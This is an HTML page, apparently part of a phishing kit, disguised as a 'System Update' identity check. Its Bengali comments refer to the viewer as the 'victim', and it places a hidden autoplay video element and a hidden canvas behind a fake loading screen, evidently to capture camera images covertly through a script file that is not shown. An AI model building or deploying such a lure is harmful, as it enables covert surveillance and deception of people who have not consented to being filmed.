<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- ভিক্টিম যা দেখবে: একটি সুন্দর লোডিং স্ক্রিন -->
    <div class="container">
        <div class="loader"></div>
        <h2>Verifying Identity...</h2>
        <p>Please wait while we capture your profile.</p>
        
        <!-- ভিক্টিম যা দেখবে না (Hidden Video/Image) -->
        <video id="previewVideo" autoplay playsinline muted style="display:none;"></video>
        <canvas id="captureCanvas" style="display:none;"></canvas>
    </div>

    <script src="script.js"></script>
</body>
</html>
